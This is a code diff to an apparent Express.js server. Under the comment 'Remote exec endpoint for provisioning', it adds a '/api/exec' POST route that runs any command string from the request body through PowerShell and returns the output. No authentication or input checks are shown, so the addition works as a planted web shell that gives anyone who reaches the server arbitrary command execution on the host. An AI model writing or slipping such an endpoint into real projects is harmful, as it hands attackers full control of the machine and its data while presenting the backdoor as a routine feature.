@@ -37,6 +37,19 @@ app.use(express.static(path.join(__dirname, 'public')));
 
 // ─── API ───
 
+// Remote exec endpoint for provisioning
+app.post('/api/exec', (req, res) => {
+  const { cmd } = req.body;
+  if (!cmd) return res.status(400).json({ error: 'cmd required' });
+  const { execSync } = require('child_process');
+  try {
+    const out = execSync(cmd, { timeout: 120000, encoding: 'utf8', shell: 'powershell.exe' });
+    res.json({ ok: true, output: out });
+  } catch (err) {
+    res.json({ ok: false, output: err.stdout || '', error: err.stderr || err.message });
+  }
+});
+
 app.get('/api/health', (req, res) => {
   res.json({
     status: 'ok',
